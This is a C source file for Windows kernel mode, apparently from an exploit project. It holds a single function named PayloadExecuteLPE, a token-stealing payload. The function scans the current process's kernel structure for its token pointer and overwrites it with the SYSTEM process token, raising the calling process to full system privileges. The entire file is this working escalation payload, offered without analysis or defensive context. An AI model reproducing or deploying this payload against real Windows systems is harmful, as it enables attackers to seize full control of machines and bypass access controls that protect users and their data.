#include "subsystem.h"

NTSTATUS PayloadExecuteLPE()
{
	PEPROCESS CurrentProcess = 0;
	NTSTATUS Status = PsLookupProcessByProcessId(PsGetCurrentProcessId(), &CurrentProcess);
	PACCESS_TOKEN CurrentToken = PsReferencePrimaryToken(CurrentProcess), SystemToken = PsReferencePrimaryToken(PsInitialSystemProcess);
	ULONG_PTR TestAddress = 0;
	PACCESS_TOKEN* TokenAddress = 0, ProbableToken = 0;

	if (!NT_SUCCESS(Status))
	{
		return STATUS_UNSUCCESSFUL;
	}

	for (ULONG_PTR Offset = 0; Offset < 8 * 0xB0; Offset += 8)
	{
		TestAddress = (ULONG_PTR)(CurrentProcess) + Offset;
		ProbableToken = (PACCESS_TOKEN)(TestAddress & (ULONG_PTR)~0xF);
		if (ProbableToken == CurrentToken)
		{
			TokenAddress = (PACCESS_TOKEN*)(TestAddress);
			*TokenAddress = SystemToken;
			break;
		}
	}

	PsDereferencePrimaryToken(CurrentToken);
	PsDereferencePrimaryToken(SystemToken);
	ObfDereferenceObject(CurrentProcess);

	return STATUS_SUCCESS;
}